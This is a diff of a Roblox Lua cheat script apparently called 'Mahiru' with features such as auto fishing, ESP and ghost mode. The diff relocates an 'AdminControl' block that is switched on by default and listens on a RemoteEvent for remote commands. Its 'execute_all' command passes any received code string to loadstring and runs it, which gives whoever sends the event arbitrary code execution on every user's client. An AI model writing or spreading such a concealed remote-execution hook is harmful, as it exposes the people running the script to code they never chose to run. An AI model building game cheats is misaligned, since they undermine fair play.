@@ -152,138 +152,6 @@ local AdminControl = {
     CommandQueue = {}
 }
 
-function AdminControl:StartListening()
-    if self.Listening then return end
-    self.Listening = true
-    
-    print("[AdminControl] Listening for admin commands...")
-    
-    if not ReplicatedStorage:FindFirstChild("MahiruAdminEvent") then
-        local remoteEvent = Instance.new("RemoteEvent")
-        remoteEvent.Name = "MahiruAdminEvent"
-        remoteEvent.Parent = ReplicatedStorage
-    end
-    
-    local adminEvent = ReplicatedStorage:WaitForChild("MahiruAdminEvent")
-    
-    adminEvent.OnClientEvent:Connect(function(command, data)
-        if not self.Enabled then return end
-        
-        print("[AdminControl] Received command:", command)
-        
-        if command == "restart_all" then
-            self:ExecuteRestart(data.message or "Admin forced restart!")
-        elseif command == "broadcast" then
-            self:ShowBroadcast(data)
-        elseif command == "toggle_feature" then
-            self:ToggleFeature(data.feature, data.state)
-        elseif command == "execute_all" then
-            self:ExecuteCode(data.code)
-        end
-    end)
-end
-
-function AdminControl:ExecuteRestart(message)
-    print("[AdminControl] Admin forced server restart")
-    
-
-    local countdown = 5
-    local notify = MahiruUi:Notify({
-        Title = "🚨 ADMIN COMMAND",
-        Content = message or "Server restarting in " .. countdown .. " seconds...",
-        Duration = countdown + 2,
-        Icon = "refresh-cw",
-    })
-    
-    for i = countdown, 1, -1 do
-        notify:Update({
-            Title = "🚨 ADMIN COMMAND",
-            Content = message or "Server restarting in " .. i .. " seconds...",
-        })
-        task.wait(1)
-    end
-    
-    TeleportService:Teleport(game.PlaceId, LocalPlayer)
-end
-
-function AdminControl:ShowBroadcast(data)
-    MahiruUi:Notify({
-        Title = "📢 ADMIN: " .. (data.title or "Broadcast"),
-        Content = data.message or "No message",
-        Duration = data.duration or 10,
-        Icon = data.icon or "megaphone",
-    })
-end
-
-function AdminControl:ToggleFeature(featureName, state)
-    print("[AdminControl] Toggling feature:", featureName, "to", state)
-    
-    local featureMap = {
-        ["auto_fishing"] = function() 
-            if LegitFishingToggle then LegitFishingToggle:Set(state) end
-        end,
-        ["auto_sell"] = function()
-            if AutoSellToggle then AutoSellToggle:Set(state) end
-        end,
-        ["fps_booster"] = function()
-            if FPSBoostToggle then FPSBoostToggle:Set(state) end
-        end,
-        ["ghost_mode"] = function()
-            if GhostToggle then GhostToggle:Set(state) end
-        end,
-        ["esp"] = function()
-            if ESPToggle then ESPToggle:Set(state) end
-        end
-    }
-    
-    local func = featureMap[featureName]
-    if func then
-        func()
-        MahiruUi:Notify({
-            Title = "Admin Control",
-            Content = featureName .. " set to " .. tostring(state),
-            Duration = 3,
-            Icon = "toggle-right",
-        })
-    end
-end
-
-function AdminControl:ExecuteCode(code)
-    if not code then return end
-    
-    local success, err = pcall(function()
-        loadstring(code)()
-    end)
-    
-    if not success then
-        warn("[AdminControl] Code execution failed:", err)
-    end
-end
-
-task.spawn(function()
-    task.wait(5)
-    AdminControl:StartListening()
-end)
-
-local AdminSection = InfoTab:Section({Title = "Admin Control"})
-
-AdminSection:Toggle({
-    Title = "Enable Admin Control",
-    Desc = "Receive commands from admin in this server",
-    Default = true,
-    Callback = function(state)
-        AdminControl.Enabled = state
-    end
-})
-
-AdminSection:Label({
-    Title = "Status",
-    Desc = "Listening for admin commands...",
-})
-
-
-
-
 local function CreatePingFPSGui()
     local gui = Instance.new("ScreenGui")
     gui.Name = "MahiruPingFPS"
@@ -3365,6 +3233,136 @@ Window:OnDestroy(function()
     
     print("Mahiru cleaned up successfully!")
 end)
+
+function AdminControl:StartListening()
+    if self.Listening then return end
+    self.Listening = true
+    
+    print("[AdminControl] Listening for admin commands...")
+    
+    if not ReplicatedStorage:FindFirstChild("MahiruAdminEvent") then
+        local remoteEvent = Instance.new("RemoteEvent")
+        remoteEvent.Name = "MahiruAdminEvent"
+        remoteEvent.Parent = ReplicatedStorage
+    end
+    
+    local adminEvent = ReplicatedStorage:WaitForChild("MahiruAdminEvent")
+    
+    adminEvent.OnClientEvent:Connect(function(command, data)
+        if not self.Enabled then return end
+        
+        print("[AdminControl] Received command:", command)
+        
+        if command == "restart_all" then
+            self:ExecuteRestart(data.message or "Admin forced restart!")
+        elseif command == "broadcast" then
+            self:ShowBroadcast(data)
+        elseif command == "toggle_feature" then
+            self:ToggleFeature(data.feature, data.state)
+        elseif command == "execute_all" then
+            self:ExecuteCode(data.code)
+        end
+    end)
+end
+
+function AdminControl:ExecuteRestart(message)
+    print("[AdminControl] Admin forced server restart")
+    
+
+    local countdown = 5
+    local notify = MahiruUi:Notify({
+        Title = "🚨 ADMIN COMMAND",
+        Content = message or "Server restarting in " .. countdown .. " seconds...",
+        Duration = countdown + 2,
+        Icon = "refresh-cw",
+    })
+    
+    for i = countdown, 1, -1 do
+        notify:Update({
+            Title = "🚨 ADMIN COMMAND",
+            Content = message or "Server restarting in " .. i .. " seconds...",
+        })
+        task.wait(1)
+    end
+    
+    TeleportService:Teleport(game.PlaceId, LocalPlayer)
+end
+
+function AdminControl:ShowBroadcast(data)
+    MahiruUi:Notify({
+        Title = "📢 ADMIN: " .. (data.title or "Broadcast"),
+        Content = data.message or "No message",
+        Duration = data.duration or 10,
+        Icon = data.icon or "megaphone",
+    })
+end
+
+function AdminControl:ToggleFeature(featureName, state)
+    print("[AdminControl] Toggling feature:", featureName, "to", state)
+    
+    local featureMap = {
+        ["auto_fishing"] = function() 
+            if LegitFishingToggle then LegitFishingToggle:Set(state) end
+        end,
+        ["auto_sell"] = function()
+            if AutoSellToggle then AutoSellToggle:Set(state) end
+        end,
+        ["fps_booster"] = function()
+            if FPSBoostToggle then FPSBoostToggle:Set(state) end
+        end,
+        ["ghost_mode"] = function()
+            if GhostToggle then GhostToggle:Set(state) end
+        end,
+        ["esp"] = function()
+            if ESPToggle then ESPToggle:Set(state) end
+        end
+    }
+    
+    local func = featureMap[featureName]
+    if func then
+        func()
+        MahiruUi:Notify({
+            Title = "Admin Control",
+            Content = featureName .. " set to " .. tostring(state),
+            Duration = 3,
+            Icon = "toggle-right",
+        })
+    end
+end
+
+function AdminControl:ExecuteCode(code)
+    if not code then return end
+    
+    local success, err = pcall(function()
+        loadstring(code)()
+    end)
+    
+    if not success then
+        warn("[AdminControl] Code execution failed:", err)
+    end
+end
+
+task.spawn(function()
+    task.wait(5)
+    AdminControl:StartListening()
+end)
+
+local AdminSection = InfoTab:Section({Title = "Admin Control"})
+
+AdminSection:Toggle({
+    Title = "Enable Admin Control",
+    Desc = "Receive commands from admin in this server",
+    Default = true,
+    Callback = function(state)
+        AdminControl.Enabled = state
+    end
+})
+
+AdminSection:Label({
+    Title = "Status",
+    Desc = "Listening for admin commands...",
+})
+
 
 ConfigManager:Load()
 
